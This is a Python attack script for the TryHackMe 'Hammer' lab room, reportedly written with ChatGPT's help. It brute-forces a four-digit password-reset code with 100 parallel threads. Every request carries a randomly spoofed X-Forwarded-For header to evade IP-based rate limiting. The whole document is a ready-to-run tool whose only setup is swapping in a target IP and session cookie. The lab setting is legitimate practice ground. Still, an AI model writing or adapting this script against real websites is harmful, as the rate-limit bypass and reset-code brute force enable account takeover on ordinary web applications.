# script with assistance of ChatGPT
# script for TryHckMe room Hammer: https://tryhackme.com/r/room/hammer
# you need to update the script with target machine IP and your Cookie 
# check video: https://youtu.be/T_F44rHKgZY

import requests
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configuration variables
ip_address = "10.10.46.106"
port = "1337"
phpsessid = "qv40uaabb5cpig354rg1adjvof"

# Base URL of the form submission page
url = f"http://{ip_address}:{port}/reset_password.php"

# Common headers for the request (without X-Forwarded-For)
common_headers = {
    "Host": f"{ip_address}:{port}",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"http://{ip_address}:{port}",
    "DNT": "1",
    "Connection": "keep-alive",
    "Referer": f"http://{ip_address}:{port}/reset_password.php",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i",
    "Cookie": f"PHPSESSID={phpsessid}"
}

# Custom exception to exit all threads once the correct code is found
class CodeFoundException(Exception):
    pass

# Function to generate all possible 4-digit codes
def generate_codes():
    for i in range(10000):
        yield f"{i:04}"  # Format the number as a 4-digit string, e.g., "0001"

# Function to send a POST request
def send_request(code):
    # Generate a random X-Forwarded-For IP address
    x_forwarded_for = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

    # Add the X-Forwarded-For header to the request headers
    headers = common_headers.copy()
    headers["X-Forwarded-For"] = x_forwarded_for

    # Data to be sent with the POST request
    data = {
        "recovery_code": code,
        "s": "106"  # Replace this with the correct hidden field value if necessary
    }

    try:
        # Send the POST request with the new X-Forwarded-For IP address
        response = requests.post(url, headers=headers, data=data, timeout=2)

        # Check if the recovery code is correct
        if "Invalid or expired recovery code!" not in response.text:
            print(f"Success! The correct code is: {code}")
            raise CodeFoundException
    except requests.RequestException:
        pass

    return False

# Function to run the requests in parallel using threading
def run_bruteforce():
    try:
        # Use a ThreadPoolExecutor to run multiple requests in parallel
        with ThreadPoolExecutor(max_workers=100) as executor:  # Adjust max_workers as needed
            futures = {executor.submit(send_request, code): code for code in generate_codes()}

            for future in as_completed(futures):
                future.result()  # Trigger the exception if the correct code is found
    except CodeFoundException:
        print("Correct code found, stopping execution.")
        executor.shutdown(wait=False)

if __name__ == "__main__":
    run_bruteforce()
